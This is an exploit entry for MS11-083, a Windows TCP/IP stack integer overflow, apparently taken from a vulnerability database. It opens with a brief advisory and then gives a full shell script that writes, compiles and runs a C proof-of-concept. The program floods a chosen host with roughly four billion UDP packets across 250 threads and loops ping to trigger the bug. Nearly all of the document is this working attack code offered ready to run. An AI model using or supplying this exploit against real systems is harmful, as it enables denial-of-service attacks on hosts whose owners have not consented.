source: http://www.securityfocus.com/bid/50517/info

Microsoft Windows is prone to a remote integer-overflow vulnerability that affects the TCP/IP stack.

An attacker can exploit this issue to execute arbitrary code with kernel-level privileges. Successful exploits will completely compromise affected computers. Failed exploit attempts may result in a denial-of-service condition. 

#!/bin/sh
cat >> winnuke2011.c << EOF
/*
* MS11-083 DoS/PoC exploit
* ========================
* This attempts to trigger the ICMP refCount overflow  
* in TCP/IP stack of Win7/Vista/Win2k8 hosts. This 
* requires sending 2^32 UDP packets to a host on a closed
* port, or 4,294,967,296 packets. A dereference function
* must be called that is not triggered via UDP but ICMP  
* echo packets. This exploit creates 250 threads and 
* floods a host with UDP packets and then attempts to
* trigger the de-ref using ping. I calculated that it
* would take approximately 52 days for the host to 
* enter a condition where this vulnerability is 
* triggerable. 
*
* -- prdelka 
*/
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h> 
#include <sys/time.h> 

int port;
int active = 0;
pthread_mutex_t mutexactive;
void *sendpackets(void *ptr);

int main(int argc, char *argv[]) {
       pthread_t thread;
       int iret,lthreads;
  pid_t pid;
  printf("[+] MS11-083 DoS/PoC exploit\n");
  if(argc<3){
    printf("[!] Usage : %s <server> <port>\n", argv[0]);
    exit(1);
  }
  char *const args[] = {"ping",argv[1],NULL};
  char *const envp[] = {"",NULL};
  port = atoi(argv[2]);
  for(lthreads=0;lthreads<250;lthreads++){//UDP flood
    iret = pthread_create(&thread,NULL,sendpackets,argv[1]);
    printf("[-] Thread number %d started\n",lthreads);
    sleep(1);
  }
  printf("[-] One does not simply barrel roll into Mordor\n");
  pid = fork();
  if(pid==0){// trigger deref.
    execve("./ping.sh",args,envp);
  };
  while(active){
  }
  printf("[-] You are finished. Patience is a virtue.\n");
  exit(0);
}

void *sendpackets(void *ptr)
{
  int sd, rc, n, echoLen, flags, error, timeOut;
  unsigned long i;
  struct sockaddr_in remoteServAddr;
  struct hostent *h;
  char str[41];
  pthread_mutex_lock(&mutexactive);
  active++;
  pthread_mutex_unlock(&mutexactive);
     srand(time(NULL));
     for (i = 0;i < 40;++i){
    str[i] = (char)((rand() % 78) + 30);
     }
     str[40] = '\0'; // yes this was off-by-one. :(
  printf("[-] Sending payload '%s'\n",str);
    h = gethostbyname(ptr);
  if(h==NULL) {
        printf("unknown host '%s' \n",(char*)ptr);
        exit(1);
    }
  remoteServAddr.sin_family = h->h_addrtype;
  memcpy((char *) &remoteServAddr.sin_addr.s_addr,h->h_addr_list[0], h->h_length);
  remoteServAddr.sin_port = htons(port);
  sd = socket(AF_INET,SOCK_DGRAM,0);
  if(sd<0){
    printf("[!] Cannot open socket\n");
    pthread_exit((void*)0);
  }
  flags = 0;
  for(i=0;i<4294967295;i++){
    rc = sendto(sd,str,strlen(str)+1,flags,(struct sockaddr *)&remoteServAddr,sizeof(remoteServAddr));
    if(rc<0){
      printf("[!] Cannot send data\n");
            close(sd);
      pthread_exit((void*)0);
        }
  }
  pthread_mutex_lock(&mutexactive);
  active--;
  pthread_mutex_unlock(&mutexactive);
  pthread_exit(NULL);
}
EOF
cat >> ping.sh << EOF
#!/bin/sh
while \`true\`;do /sbin/ping -c 1 \$1;done
EOF
chmod +x ping.sh
gcc winnuke2011.c -o winnuke2011 
./winnuke2011